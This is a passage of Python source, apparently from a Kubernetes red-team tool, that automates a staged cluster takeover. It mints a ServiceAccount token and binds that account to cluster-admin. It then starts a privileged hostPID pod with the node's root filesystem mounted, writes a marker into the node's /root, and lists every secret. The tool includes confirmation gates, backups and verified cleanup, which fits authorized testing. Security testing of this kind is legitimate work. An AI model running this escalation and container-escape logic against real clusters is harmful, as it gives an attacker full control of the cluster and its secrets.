                    and self.tb_can_i("get", "secrets", all_namespaces=True))):
            raise StageFailed("cluster-admin 绑定未生效（can-i 复核失败）")


def _snapshot_stage(ctx: _Ctx, stage: dict[str, Any]) -> list[dict[str, Any]]:
    targets = list(stage.get("backup_targets") or [])
    if not targets:
        raise StageFailed("写阶段缺少备份目标")
    payloads: list[dict[str, Any]] = []
    for i, target in enumerate(targets):
        kind = target.get("kind")
        observed: Any = None
        if kind == "kube":
            resource = str(target.get("resource") or "")
            name = str(target.get("name") or "").replace("<proof-marker>", ctx.slug)
            ns = str(target.get("namespace") or "").replace("<proof-marker>", ctx.slug)
            observed = ctx.backend.get(resource, name, namespace=ns or None)
            ctx.originals[f"kube:{resource}:{ns}/{name}"] = observed
        elif kind == "node-file":
            path = ctx.node_path
            call = ctx.backend.exec(ctx.pwn_pod, ["/bin/sh", "-c", f"test -f /host{path}"],
                                    ctx.namespace)
            if call.rc == 0:
                read = ctx.backend.exec(ctx.pwn_pod, ["/bin/sh", "-c", f"cat /host{path}"],
                                        ctx.namespace)
                observed = {"path": path, "content_sha256": _sha256(read.stdout),
                            "content_length": len(read.stdout)}
            ctx.originals[f"node-file:{path}"] = observed
        else:
            raise StageFailed(f"未知备份目标类型 {kind}")
        body = {"target": target, "observed": observed, "absent": observed is None,
                "at": time.time()}
        path = ctx.run.dir / "backups" / f"objective-{stage['id']}-{i}.json"
        path.parent.mkdir(parents=True, exist_ok=True)
        path.write_text(json.dumps(body, ensure_ascii=False, indent=2), encoding="utf-8")
        desc = f"{kind}:{target.get('resource') or target.get('path')}/{target.get('name') or ''}"
        bid = ctx.run.record_backup(stage["id"], desc, path, "objective-cleanup")
        payloads.append({"backup_id": bid, "target": target, "absent": observed is None,
                         "path": str(path.relative_to(ctx.run.dir)).replace("\\", "/"),
                         "sha256": _sha256(path.read_bytes())})
    return payloads


# ---------------------------------------------------------------- stages

def _stage_entry(ctx: _Ctx) -> dict[str, Any]:
    ready = ctx.backend.readyz()
    if not ready.get("ok"):
        raise StageFailed(f"集群 /readyz 不可用: {ready.get('stderr') or ready.get('stdout')}")
    nodes = ctx.backend.nodes()
    if not any(n.get("ready") for n in nodes):
        raise StageFailed("没有 Ready 节点")
    services = ctx.backend.services()
    exposed = [s for s in services if s.get("nodePort") or s.get("type") == "NodePort"]
    if not exposed:
        raise StageFailed("未发现 NodePort/Service 暴露面")
    preferred = next((s for s in exposed
                      if s.get("namespace") == ctx.namespace and s.get("nodePort")),
                     next((s for s in exposed if s.get("nodePort")), exposed[0]))
    if not preferred.get("nodePort"):
        raise StageFailed("暴露面没有 NodePort，无法验证入口")
    url = ctx.entry_url or f"http://127.0.0.1:{preferred['nodePort']}/"
    probe = ctx.backend.probe_url(url)
    for _ in range(4):
        if probe.get("status") == 200:
            break
        time.sleep(1.5)
        probe = ctx.backend.probe_url(url)
    if probe.get("status") != 200:
        raise StageFailed(f"入口 HTTP 探测失败: {probe.get('status')} "
                          f"{probe.get('error') or ''}")
    fixture = ctx.chain["objective"].get("fixture") or {}
    sa_name = fixture.get("serviceaccount", "inkblade-operator")
    if not ctx.backend.get("serviceaccounts", sa_name, namespace=ctx.namespace):
        raise StageFailed(f"脆弱 operator SA 不存在: {ctx.namespace}/{sa_name}")
    subject = f"system:serviceaccount:{ctx.namespace}:{sa_name}"
    can_rb = ctx.backend.can_i("create", "rolebindings", namespace=ctx.namespace,
                               as_sa=subject)
    can_crb = ctx.backend.can_i("create", "clusterrolebindings", as_sa=subject)
    if not (can_rb and can_crb):
        raise StageFailed(f"operator SA 不具备 RBAC 写权限 (rolebindings={can_rb}, "
                          f"clusterrolebindings={can_crb})")
    ctx.action("list", "services", result={"count": len(services),
                                           "exposed": len(exposed)})
    ctx.action("get", "serviceaccount", ctx.namespace, sa_name,
               result={"subject": subject}, mutates=False)
    return {"readyz": ready, "nodes": nodes,
            "services": {"count": len(services), "exposed": exposed},
            "entry": {"url": url, "http": probe, "service": preferred},
            "operator": {"subject": subject, "namespace": ctx.namespace,
                         "can_create_rolebindings": can_rb,
                         "can_create_clusterrolebindings": can_crb}}


def _stage_credential(ctx: _Ctx) -> dict[str, Any]:
    fixture = ctx.chain["objective"].get("fixture") or {}
    sa_name = fixture.get("serviceaccount", "inkblade-operator")
    sa = ctx.backend.get("serviceaccounts", sa_name, namespace=ctx.namespace)
    if not sa:
        raise StageFailed(f"ServiceAccount 不存在: {ctx.namespace}/{sa_name}")
    token = ctx.backend.create_token(sa_name, ctx.namespace)
    if not token:
        raise StageFailed("TokenRequest 返回空 token")
    ctx.token = token
    if getattr(ctx.backend, "kind", "") == "fake-kubectl":
        ctx.token_backend = ctx.backend
    else:
        config_path = ctx.run.dir / "objective" / "token.kubeconfig"
        ctx.backend.kubeconfig_with_token(token, config_path)
        ctx.token_backend = ctx.backend.with_kubeconfig(config_path)
        ctx.token_kubeconfig = str(config_path)
    who = ctx.tb_whoami()
    username = str((who or {}).get("username") or "")
    expected = f"system:serviceaccount:{ctx.namespace}:{sa_name}"
    if username != expected:
        raise StageFailed(f"token whoami 身份不符: {username or 'unknown'} != {expected}")
    can_rb = ctx.tb_can_i("create", "rolebindings", namespace=ctx.namespace)
    can_crb = ctx.tb_can_i("create", "clusterrolebindings")
    if not (can_rb and can_crb):
        raise StageFailed("token 不具备 RBAC 提权所需权限")
    ctx.action("create", "serviceaccounts/token", ctx.namespace, sa_name,
               result={"fingerprint": _fingerprint(token)}, mutates=False)
    annotations = (sa.get("metadata", {}) or {}).get("annotations") or {}
    return {"token": _fingerprint(token), "whoami": who,
            "can_i": {"create_rolebindings": can_rb,
                      "create_clusterrolebindings": can_crb},
            "credential_branches": {
                "service_account_token": "executed (TokenRequest)",
                "default_service_account_token": "discovered read-only; not used",
                "irsa": ("annotation present; read-only version gate"
                         if annotations.get("eks.amazonaws.com/role-arn")
                         else "not applicable (no eks.amazonaws.com/role-arn annotation)"),
                "default_key": "not executed: credential files are never read by this objective"}}


def _stage_rbac(ctx: _Ctx) -> dict[str, Any]:
    ctx.require_token()
    if not ctx.backend.get("namespaces", ctx.namespace):
        raise StageFailed(f"namespace {ctx.namespace} 不存在")
    fixture = ctx.chain["objective"].get("fixture") or {}
    sa_name = fixture.get("serviceaccount", "inkblade-operator")
    subject = {"kind": "ServiceAccount", "name": sa_name, "namespace": ctx.namespace}
    rb = ctx.tb_apply({
        "apiVersion": "rbac.authorization.k8s.io/v1", "kind": "RoleBinding",
        "metadata": {"name": ctx.pwn_rb, "namespace": ctx.namespace,
                     "labels": {"inkblade.io/objective": ctx.slug}},
        "roleRef": {"apiGroup": "rbac.authorization.k8s.io", "kind": "ClusterRole",
                    "name": "cluster-admin"},
        "subjects": [subject]})
    ctx.action("create", "rolebinding", ctx.namespace, ctx.pwn_rb, result=rb, mutates=True)
    crb = ctx.tb_apply({
        "apiVersion": "rbac.authorization.k8s.io/v1", "kind": "ClusterRoleBinding",
        "metadata": {"name": ctx.pwn_crb, "labels": {"inkblade.io/objective": ctx.slug}},
        "roleRef": {"apiGroup": "rbac.authorization.k8s.io", "kind": "ClusterRole",
                    "name": "cluster-admin"},
        "subjects": [subject]})
    ctx.action("create", "clusterrolebinding", "", ctx.pwn_crb, result=crb, mutates=True)
    rb_read = ctx.tb_get("rolebindings", ctx.pwn_rb, namespace=ctx.namespace)
    crb_read = ctx.tb_get("clusterrolebindings", ctx.pwn_crb)
    if not rb_read or not crb_read:
        raise StageFailed("cluster-admin 绑定回读失败")
    ctx.ensure_cluster_admin()
    return {"rolebinding": rb_read, "clusterrolebinding": crb_read,
            "can_i": {"all": ctx.tb_can_i("*", "*", all_namespaces=True),
                      "create_namespace": ctx.tb_can_i("create", "namespaces"),
                      "get_all_secrets": ctx.tb_can_i("get", "secrets",
                                                      all_namespaces=True)},
            "role": "cluster-admin"}


def _stage_privileged_pod(ctx: _Ctx) -> dict[str, Any]:
    ctx.require_token()
    ctx.ensure_cluster_admin()
    obj = ctx.tb_apply({
        "apiVersion": "v1", "kind": "Pod",
        "metadata": {"name": ctx.pwn_pod, "namespace": ctx.namespace,
                     "labels": {"inkblade.io/objective": ctx.slug,
                                "app": "inkblade-proof"}},
        "spec": {"hostPID": True, "hostNetwork": False,
                 "automountServiceAccountToken": False, "restartPolicy": "Never",
                 "containers": [{"name": "proof", "image": ctx.pod_image,
                                 "command": ["/bin/sh", "-c", "sleep 3600"],
                                 "securityContext": {"privileged": True, "runAsUser": 0,
                                                     "capabilities": {"add": ["SYS_ADMIN"]}},
                                 "volumeMounts": [{"name": "host", "mountPath": "/host"}]}],
                 "volumes": [{"name": "host", "hostPath": {"path": "/"}}]}})
    ctx.action("create", "pod", ctx.namespace, ctx.pwn_pod, result=obj, mutates=True)
    deadline = time.monotonic() + 90
    pod = None
    while time.monotonic() < deadline:
        pod = ctx.backend.get("pods", ctx.pwn_pod, namespace=ctx.namespace)
        phase = str(((pod or {}).get("status") or {}).get("phase") or "")
        if phase == "Running":
            break
        if phase in ("Failed", "Succeeded"):
            raise StageFailed(f"特权 Pod 未运行: phase={phase}")
        time.sleep(2)
    if not pod or str((pod.get("status") or {}).get("phase")) != "Running":
        raise StageFailed("特权 Pod 等待 Running 超时")
    spec = pod.get("spec") or {}
    security = ((spec.get("containers") or [{}])[0].get("securityContext") or {})
    host_path = (((spec.get("volumes") or [{}])[0].get("hostPath") or {}).get("path"))
    if not (security.get("privileged") and spec.get("hostPID") and host_path == "/"):
        raise StageFailed("特权 Pod 字段回读不符（privileged/hostPID/hostPath=/）")
    return {"pod": {"name": ctx.pwn_pod, "namespace": ctx.namespace,
                    "nodeName": spec.get("nodeName"), "phase": "Running"},
            "verified": {"privileged": True, "hostPID": True, "hostPath": "/",
                         "uid": security.get("runAsUser")}}


def _stage_node_marker(ctx: _Ctx) -> dict[str, Any]:
    pod = ctx.backend.get("pods", ctx.pwn_pod, namespace=ctx.namespace)
    if not pod or str((pod.get("status") or {}).get("phase")) != "Running":
        raise StageFailed("特权 Pod 不在 Running 状态")
    ident = ctx.backend.exec(ctx.pwn_pod, ["/bin/sh", "-c", "id"], ctx.namespace)
    hostname = ctx.backend.exec(ctx.pwn_pod, ["/bin/sh", "-c", "cat /host/etc/hostname"],
                                ctx.namespace)
    root_ls = ctx.backend.exec(ctx.pwn_pod, ["/bin/sh", "-c", "ls -ld /host/root"],
                               ctx.namespace)
    if ident.rc != 0 or "uid=0" not in ident.stdout:
        raise StageFailed(f"容器内不是 root: {ident.stdout.strip()[:200]}")
    content = f"{ctx.marker_name}|node={hostname.stdout.strip()}|ts={int(time.time())}"
    script = (f"printf '%s' '{content}' > {ctx.node_path_in_pod} && "
              f"sha256sum {ctx.node_path_in_pod}")
    write = ctx.backend.exec(ctx.pwn_pod, ["/bin/sh", "-c", script], ctx.namespace)
    if write.rc != 0:
        raise StageFailed(f"节点 marker 写入失败: {write.stderr.strip()[:400]}")
    node_sha = (write.stdout.strip().split() or [""])[0]
    readback = ctx.backend.exec(ctx.pwn_pod, ["/bin/sh", "-c",
                                              f"cat {ctx.node_path_in_pod}"],
                                ctx.namespace)
    local_sha = _sha256(content)
    if node_sha != local_sha or readback.stdout != content:
        raise StageFailed("节点 marker 回读/哈希不一致")
    ctx.action("exec", "pods", ctx.namespace, ctx.pwn_pod,
               result={"op": "write-node-marker", "path": ctx.node_path,
                       "sha256": local_sha}, mutates=True)
    return {"pod": ctx.pwn_pod, "uid": ident.stdout.strip(),
            "node_hostname": hostname.stdout.strip(),
            "node_root_listing": root_ls.stdout.strip(),
            "marker": {"path": ctx.node_path, "content": content, "sha256": local_sha,
                       "readback_match": True, "verified": True}}


def _stage_cluster_proof(ctx: _Ctx) -> dict[str, Any]:
    ctx.ensure_cluster_admin()
    marker = ctx.backend.exec(ctx.pwn_pod, ["/bin/sh", "-c",
                                            f"cat {ctx.node_path_in_pod}"],
                              ctx.namespace)
    if marker.rc != 0 or not marker.stdout:
        raise StageFailed("节点 marker 复核失败")
    secrets = ctx.tb_list_secrets()
    if not secrets:
        raise StageFailed("cluster-admin token 无法列举 secrets")
    ns = ctx.tb_apply({
        "apiVersion": "v1", "kind": "Namespace",
        "metadata": {"name": ctx.test_namespace,
                     "labels": {"inkblade.io/objective": ctx.slug}}})
    ctx.action("create", "namespace", "", ctx.test_namespace, result=ns, mutates=True)
    deadline = time.monotonic() + 30
    while time.monotonic() < deadline:
        if ctx.backend.get("namespaces", ctx.test_namespace):
            break
        time.sleep(1)
    if not ctx.backend.get("namespaces", ctx.test_namespace):
        raise StageFailed("测试 namespace 创建后不可见")
    node_name = (ctx.stage_evidence.get("stage-5-node-marker") or {}).get(
        "node_hostname", "")
    cm = ctx.tb_apply({
        "apiVersion": "v1", "kind": "ConfigMap",
        "metadata": {"name": "inkblade-proof", "namespace": ctx.test_namespace},
        "data": {"marker": ctx.marker_name, "node": node_name,
                 "secret_count": str(len(secrets)), "objective": CHAIN_ID}})
    ctx.action("create", "configmap", ctx.test_namespace, "inkblade-proof", result=cm,
               mutates=True)
    cm_read = ctx.backend.get("configmaps", "inkblade-proof", namespace=ctx.test_namespace)
    if not cm_read or (cm_read.get("data") or {}).get("marker") != ctx.marker_name:
        raise StageFailed("测试 ConfigMap 回读失败")
    return {"secrets": {"count": len(secrets),
                        "namespaces": sorted({s["namespace"] for s in secrets}),
                        "names": [f"{s['namespace']}/{s['name']}" for s in secrets]},
            "test_namespace": {"name": ctx.test_namespace, "created": True},
            "test_configmap": {"name": "inkblade-proof", "namespace": ctx.test_namespace,
                               "read_back": True, "data": cm_read.get("data") or {}},
            "node_marker_readback": marker.stdout, "nodes": ctx.backend.nodes()}


_SINGULAR = {"namespaces": "namespace", "namespace": "namespace",
             "clusterrolebindings": "clusterrolebinding",
             "rolebindings": "rolebinding", "pods": "pod", "configmaps": "configmap",
             "serviceaccounts": "serviceaccount", "clusterroles": "clusterrole"}


def _delete_target(ctx: _Ctx, resource: str, name: str, namespace: str) -> str:
    if not name:
        return "skipped-empty-name"
    label = _SINGULAR.get(resource, resource)
    try:
        existed = ctx.backend.get(resource, name, namespace=namespace or None)
        if existed is None:
            ctx.action("delete", label, namespace, name, result="not-found", mutates=True)
            return "not-found"
        ctx.backend.delete(resource, name, namespace=namespace or None)
        ctx.action("delete", label, namespace, name, result="deleted", mutates=True)
        return "deleted"
    except Exception as exc:  # cleanup must keep going
        ctx.action("delete", label, namespace, name, result=f"error:{exc}", mutates=True)
        return f"error:{exc}"


def _stage_cleanup(ctx: _Ctx) -> dict[str, Any]:
    checks: list[dict[str, Any]] = []
    residue: list[str] = []
    pod = ctx.backend.get("pods", ctx.pwn_pod, namespace=ctx.namespace)
    marker_check: dict[str, Any] = {"check": "node marker", "path": ctx.node_path,
                                    "ok": True, "observed": "pod absent; marker unverifiable"}
    if pod:
        absent = ctx.backend.exec(ctx.pwn_pod, ["/bin/sh", "-c",
                                               f"test ! -f {ctx.node_path_in_pod}"],
                                  ctx.namespace)
        if absent.rc != 0:
            ctx.backend.exec(ctx.pwn_pod, ["/bin/sh", "-c",
                                           f"rm -f {ctx.node_path_in_pod}"], ctx.namespace)
            ctx.action("exec", "pods", ctx.namespace, ctx.pwn_pod,
                       result={"op": "remove-node-marker", "path": ctx.node_path},
                       mutates=True)
        absent = ctx.backend.exec(ctx.pwn_pod, ["/bin/sh", "-c",
                                               f"test ! -f {ctx.node_path_in_pod}"],
                                  ctx.namespace)
        marker_check = {"check": "node marker", "path": ctx.node_path,
                        "ok": absent.rc == 0,
                        "observed": "absent" if absent.rc == 0 else "present"}
    checks.append(marker_check)
    if not marker_check["ok"]:
        residue.append(f"node-marker:{ctx.node_path}")

    _delete_target(ctx, "configmaps", "inkblade-proof", ctx.test_namespace)
    _delete_target(ctx, "namespaces", ctx.test_namespace, "")
    _delete_target(ctx, "clusterrolebindings", ctx.pwn_crb, "")
    _delete_target(ctx, "rolebindings", ctx.pwn_rb, ctx.namespace)
    _delete_target(ctx, "pods", ctx.pwn_pod, ctx.namespace)
    deadline = time.monotonic() + 60
    while time.monotonic() < deadline:
        if not ctx.backend.get("namespaces", ctx.test_namespace):
            break
        time.sleep(1)

    if ctx.cleanup_fixture:
        fixture = ctx.chain["objective"].get("fixture") or {}
        _delete_target(ctx, "clusterrolebindings", fixture.get("clusterrolebinding", ""), "")
        _delete_target(ctx, "clusterroles", fixture.get("clusterrole", ""), "")
        _delete_target(ctx, "serviceaccounts", fixture.get("serviceaccount", ""),
                       ctx.namespace)
        _delete_target(ctx, "namespaces", ctx.namespace, "")
        deadline = time.monotonic() + 120
        while time.monotonic() < deadline:
            crb_gone = not ctx.backend.get("clusterrolebindings",
                                           fixture.get("clusterrolebinding", ""))
            role_gone = not ctx.backend.get("clusterroles", fixture.get("clusterrole", ""))
            ns_gone = not ctx.backend.get("namespaces", ctx.namespace)
            if crb_gone and role_gone and ns_gone:
                break
            time.sleep(1)

    for label, resource, name, ns in (
            ("namespace", "namespaces", ctx.test_namespace, ""),
            ("clusterrolebinding", "clusterrolebindings", ctx.pwn_crb, ""),
            ("rolebinding", "rolebindings", ctx.pwn_rb, ctx.namespace),
            ("pod", "pods", ctx.pwn_pod, ctx.namespace)):
        exists = ctx.backend.get(resource, name, namespace=ns or None)
        checks.append({"check": f"{label} {name} absent", "ok": exists is None,
                       "observed": "absent" if exists is None else "present"})
        if exists is not None:
            residue.append(f"{label}:{ns}/{name}")
    if ctx.cleanup_fixture:
        fixture = ctx.chain["objective"].get("fixture") or {}
        for label, resource, name, ns in (
                ("fixture-clusterrolebinding", "clusterrolebindings",
                 fixture.get("clusterrolebinding", ""), ""),
                ("fixture-clusterrole", "clusterroles", fixture.get("clusterrole", ""), ""),
                ("fixture-namespace", "namespaces", ctx.namespace, "")):
            exists = ctx.backend.get(resource, name, namespace=ns or None)
            checks.append({"check": f"{label} {name} absent", "ok": exists is None,
                           "observed": "absent" if exists is None else "present"})
            if exists is not None:
                residue.append(f"{label}:{ns}/{name}")

    baseline = ctx.stage_evidence.get("__baseline__") or {}
    expected_namespaces = set(baseline.get("namespaces") or [])
    if ctx.cleanup_fixture:
        expected_namespaces.discard(ctx.namespace)
    actual_namespaces = set(ctx.backend.namespaces())
    ns_ok = actual_namespaces == expected_namespaces
    checks.append({"check": "namespace set equals baseline", "ok": ns_ok,
                   "observed": {"expected": sorted(expected_namespaces),
                                "actual": sorted(actual_namespaces)}})
    if not ns_ok:
        residue.append(f"namespace-delta:{sorted(actual_namespaces ^ expected_namespaces)}")

    baseline_secrets = {(s["namespace"], s["name"]) for s in (baseline.get("secrets") or [])}
    if ctx.cleanup_fixture:
        baseline_secrets = {s for s in baseline_secrets if s[0] != ctx.namespace}
    actual_secrets = {(s["namespace"], s["name"]) for s in ctx.backend.list_secrets()}
    secrets_ok = actual_secrets == baseline_secrets
    checks.append({"check": "secret name set equals baseline", "ok": secrets_ok,
                   "observed": {"expected_count": len(baseline_secrets),
                                "actual_count": len(actual_secrets),
                                "delta": sorted(actual_secrets ^ baseline_secrets)[:20]}})
    if not secrets_ok:
        residue.append("secret-delta")
    crbs = set(ctx.backend.clusterrolebindings())
    checks.append({"check": "no objective clusterrolebinding", "ok": ctx.pwn_crb not in crbs,
                   "observed": sorted(x for x in crbs
                                      if x.startswith("inkblade-pwn"))[:10]})
    if ctx.pwn_crb in crbs:
        residue.append(f"clusterrolebinding:{ctx.pwn_crb}")
    verified = all(c["ok"] for c in checks) and not residue
    return {"verified": verified, "checks": checks, "residue": residue,
            "baseline": baseline, "fixture_cleanup": bool(ctx.cleanup_fixture),
            "generated_at": time.time(),
            "receipt": "objective-cleanup.json"}


_STAGE_EXECUTORS: dict[int, Callable[[_Ctx], dict[str, Any]]] = {
    1: _stage_entry, 2: _stage_credential, 3: _stage_rbac,
    4: _stage_privileged_pod, 5: _stage_node_marker,
    6: _stage_cluster_proof, 7: _stage_cleanup}


# ---------------------------------------------------------------- execution

def _stage_prompt(stage: dict[str, Any], lang: str = "bi") -> str:
    title = _pick(lang, stage["title"]["zh"], stage["title"]["en"])
    return (f"阶段 {stage['index']}/{STAGE_COUNT} — {title}\n"
            f"  原语: {stage['primitive']}\n"
            f"  写操作: {'是' if stage['writes'] else '否'}；"
            f"备份目标: {len(stage.get('backup_targets') or [])}\n"
            f"  成功证据: {'; '.join(stage['success_evidence'][:3])}\n"
            f"  失败回退: {stage['fallback']}")


def _snapshot_from_backend(backend: Any) -> dict[str, Any] | None:
    """把 backend.state 投影成提权矩阵可消费的快照（无 state 的真实后端返回 None）。"""
    state = getattr(backend, "state", None)
    if not isinstance(state, dict):
        return None

    def entries(key: str) -> list[dict[str, Any]]:
        value = state.get(key)
        if isinstance(value, dict):
            return [v for v in value.values() if isinstance(v, dict)]
        if isinstance(value, list):
            return [v for v in value if isinstance(v, dict)]
        return []

    def meta_name(obj: dict[str, Any]) -> str:
        return str(obj.get("name") or (obj.get("metadata") or {}).get("name") or "")

    clusterroles = [{"name": meta_name(cr), "rules": list(cr.get("rules") or [])}
                    for cr in entries("clusterroles")]
    clusterrolebindings = [{
        "name": meta_name(b),
        "role": str(b.get("role") or (b.get("roleRef") or {}).get("name") or ""),
        "subjects": list(b.get("subjects") or []),
    } for b in entries("clusterrolebindings")]
    rolebindings = [{
        "name": meta_name(b),
        "role": str(b.get("role") or (b.get("roleRef") or {}).get("name") or ""),
        "subjects": list(b.get("subjects") or []),
    } for b in entries("rolebindings")]
    serviceaccounts = [{
        "name": meta_name(sa),
        "namespace": str((sa.get("metadata") or {}).get("namespace") or
                         sa.get("namespace") or "default"),
    } for sa in entries("serviceaccounts")]
    pods = []
    for pod in entries("pods"):
        spec = pod.get("spec") or {}
        pods.append({
            "name": meta_name(pod),
            "namespace": str((pod.get("metadata") or {}).get("namespace") or
                             pod.get("namespace") or "default"),
            "serviceAccount": str(spec.get("serviceAccountName") or
                                  pod.get("serviceAccount") or "default"),
            "automountServiceAccountToken": spec.get("automountServiceAccountToken"),
        })
    cani = []
    for row in entries("cani"):
        cani.append({"subject": row.get("subject", ""), "allowed": row.get("allowed", [])})
    return {
        "clusterroles": clusterroles,
        "clusterrolebindings": clusterrolebindings,
        "rolebindings": rolebindings,
        "serviceaccounts": serviceaccounts,
        "pods": pods,
        "cani": cani,
        "source": "backend.state",
    }


def _select_privesc(backend: Any) -> dict[str, Any]:
    """阶段③前自动选路；失败时返回 no-path 并回退到 objective_chain 的 stage-3 引擎。"""
    try:
        from .objective import plan_objective  # 延迟导入避免循环

        snapshot = _snapshot_from_backend(backend)
        if not snapshot:
            return {"status": "unavailable",
                    "reason": "backend 未暴露 state 快照；使用 objective_chain 的 stage-3 引擎",
                    "fallback": "stage-3-rbac-escalation"}
        plan = plan_objective("cluster-takeover", snapshot=snapshot, limit=4)
        phase3 = next(p for p in plan["phases"] if p.get("index") == 3)
        selection = phase3["selection"]
        chosen = selection.get("chosen") or {}
        return {
            "status": "selected",
            "principal": plan["principal"],
            "chosen": chosen,
            "alternates": selection.get("alternates") or [],
            "rationale": selection.get("rationale", ""),
            "explanation": selection.get("explanation", ""),
            "already_admin": not bool(chosen.get("vector_ids")),
            "source": "backend.state snapshot → privesc.paths",
        }
    except Exception as exc:  # noqa: BLE001 —— 选路失败不阻断既有 7 阶段引擎
        return {"status": "no-path",
                "error": f"{type(exc).__name__}: {exc}",
                "fallback": "stage-3-rbac-escalation"}


def run_objective(store: EvidenceStore, session, chain: dict[str, Any], backend: Any,
                  *, proof_marker: str, namespace: str | None = None,
                  auto_approve: bool = False,
                  confirm: Callable[[dict[str, Any]], bool] | None = None,
                  max_stage: int = STAGE_COUNT, stage_timeout: float | None = None,
                  cleanup_fixture: bool = False, entry_url: str | None = None,
                  pod_image: str = "alpine:3.21",
                  out_dir: Path | str | None = None, dry_run: bool = False,
                  host: str | None = None) -> dict[str, Any]:
    if not 1 <= int(max_stage) <= STAGE_COUNT:
        raise ValueError(f"max_stage 必须在 1–{STAGE_COUNT}")
    ns = namespace or (chain["objective"].get("namespace_default") or "inkblade-killchain")
    gates = check_gates(store, session, chain, ns, host=host, auto_approve=auto_approve)
    stages = chain["objective"]["stages"]
    # 阶段③前自动选路：记录最短可行提权路径、理由与备选；失败回退 stage-3 引擎
    privesc_selection = _select_privesc(backend)
    if dry_run:
        return {"dry_run": True, "chain": CHAIN_ID, "gates": gates,
                "stages": [{"index": s["index"], "id": s["id"], "title": s["title"],
                            "primitive": s["primitive"], "writes": s["writes"],
                            "preconditions": s["preconditions"],
                            "backup_targets": s["backup_targets"],
                            "success_evidence": s["success_evidence"],
                            "fallback": s["fallback"], "timeout_s": s["timeout_s"],
                            "detection_rules": s["detection_rules"]} for s in stages],
                "max_stage": int(max_stage),
                "cleanup_forced": int(max_stage) < STAGE_COUNT,
                "privesc_selection": privesc_selection,
                "backend": getattr(backend, "kind", "unknown")}
    if not auto_approve and confirm is None and not sys.stdin.isatty():
        raise GateRefused("逐阶段确认需要交互终端；非交互环境请使用 --auto-approve"
                          "（仅限全影响演示 + lead）")

    raw_marker, slug, marker_name = normalize_marker(proof_marker)
    run = store.create_run(f"objective-{CHAIN_ID}-{time.strftime('%Y%m%d-%H%M%S')}-{slug}")
    ctx = _Ctx(backend=backend, store=store, run=run, session=session, chain=chain,
               marker=raw_marker, slug=slug, marker_name=marker_name, namespace=ns,
               test_namespace=f"inkblade-proof-{slug}",
               pwn_rb=f"inkblade-pwn-rb-{slug}", pwn_crb=f"inkblade-pwn-crb-{slug}",
               pwn_pod=f"inkblade-pwn-pod-{slug}",
               node_path=f"/root/{marker_name}", pod_image=pod_image,
               entry_url=entry_url, cleanup_fixture=cleanup_fixture)
    run.log_action(session.name, "objective", CHAIN_ID,
                   {"marker": raw_marker, "namespace": ns, "max_stage": int(max_stage)},
                   "started")
    baseline = {"namespaces": backend.namespaces(), "secrets": backend.list_secrets(),
                "clusterrolebindings": backend.clusterrolebindings(),
                "captured_at": time.time()}
    ctx.stage_evidence["__baseline__"] = baseline
    ctx.stage_evidence["__privesc_selection__"] = privesc_selection

    stage_results: list[dict[str, Any]] = []
    failed_stage: str | None = None
    cancelled = False
    selected = [s for s in stages if s["index"] <= int(max_stage)]
    if int(max_stage) < STAGE_COUNT:
        selected.append(stages[-1])
    for stage in selected:
        idx = stage["index"]
        stage = dict(stage)
        if idx == 7 and int(max_stage) < STAGE_COUNT:
            stage["_forced"] = True
        ctx.stage_id = stage["id"]
        try:
            backend.stage_id = stage["id"]
        except Exception:
            pass
        try:
            assert_not_aborted(store)
        except ExecutionLocked as exc:
            failed_stage = stage["id"]
            stage_results.append({"index": idx, "id": stage["id"], "status": "failed",
                                  "error": f"aborted: {exc}", "fallback": stage["fallback"]})
            break
        if stage.get("confirm", True) and not auto_approve:
            try:
                approved = bool(confirm(stage)) if confirm else _ask_confirmation(stage)
            except ObjectiveCancelled:
                approved = False
            if not approved:
                cancelled = True
                stage_results.append({"index": idx, "id": stage["id"],
                                      "status": "cancelled"})
                break
        timeout = float(stage_timeout or stage["timeout_s"])
        deadline = time.monotonic() + timeout
        try:
            backend.call_timeout = max(1.0, timeout)
        except Exception:
            pass
        backups: list[dict[str, Any]] = []
        started = time.time()
        try:
            if stage["writes"]:
                backups = _snapshot_stage(ctx, stage)
                if not backups:
                    raise StageFailed("备份闸门：未取得任何快照回执")
            if time.monotonic() > deadline:
                raise StageFailed(f"stage timeout after {timeout:.1f}s "
                                  f"(before {stage['id']})")
            evidence = _STAGE_EXECUTORS[idx](ctx)
            if time.monotonic() > deadline:
                raise StageFailed(f"stage timeout after {timeout:.1f}s")
            ctx.stage_evidence[stage["id"]] = evidence
            status = "success"
            error = None
            if idx == 7 and not evidence.get("verified", False):
                status = "failed"
                error = "cleanup verification failed: " + \
                        ", ".join(evidence.get("residue") or [])
            stage_result = {"index": idx, "id": stage["id"], "status": status,
                            "started_at": started, "finished_at": time.time(),
                            "timeout_s": timeout, "backups": backups,
                            "evidence": evidence}
            if error:
                stage_result["error"] = error
                failed_stage = failed_stage or stage["id"]
        except (StageFailed, ObjectiveError) as exc:
            error = str(exc)
            if "timeout" in error.lower():
                error = f"stage timeout after {timeout:.1f}s: {error}"
            failed_stage = failed_stage or stage["id"]
            stage_result = {"index": idx, "id": stage["id"], "status": "failed",
                            "started_at": started, "finished_at": time.time(),
                            "timeout_s": timeout, "backups": backups, "error": error,
                            "fallback": stage["fallback"]}
        except Exception as exc:  # noqa: BLE001
            failed_stage = failed_stage or stage["id"]
            stage_result = {"index": idx, "id": stage["id"], "status": "failed",
                            "started_at": started, "finished_at": time.time(),
                            "timeout_s": timeout, "backups": backups,
                            "error": f"{type(exc).__name__}: {exc}",
                            "fallback": stage["fallback"]}
        try:
            _persist_stage(ctx, stage, stage_result, backups)
        except Exception as exc:  # noqa: BLE001
            stage_result["persist_error"] = f"{type(exc).__name__}: {exc}"
        stage_results.append(stage_result)
        if stage_result["status"] != "success":
            break

    ran_cleanup = any(r["index"] == 7 for r in stage_results)
    if not ran_cleanup:
        stage7 = stages[-1]
        ctx.stage_id = stage7["id"]
        try:
            backend.stage_id = stage7["id"]
            assert_not_aborted(store)
        except Exception:
            pass
        try:
            backups = _snapshot_stage(ctx, stage7)
            evidence = _stage_cleanup(ctx)
            ctx.stage_evidence[stage7["id"]] = evidence
            status = "success" if evidence.get("verified") else "failed"
            stage_result = {"index": 7, "id": stage7["id"], "status": status,
                            "started_at": time.time(), "finished_at": time.time(),
                            "timeout_s": float(stage_timeout or stage7["timeout_s"]),
                            "backups": backups, "evidence": evidence, "forced": True}
            if status != "success":
                failed_stage = failed_stage or stage7["id"]
                stage_result["error"] = "cleanup verification failed: " + \
                                        ", ".join(evidence.get("residue") or [])
            _persist_stage(ctx, stage7, stage_result, backups)
            stage_results.append(stage_result)
        except Exception as exc:  # noqa: BLE001
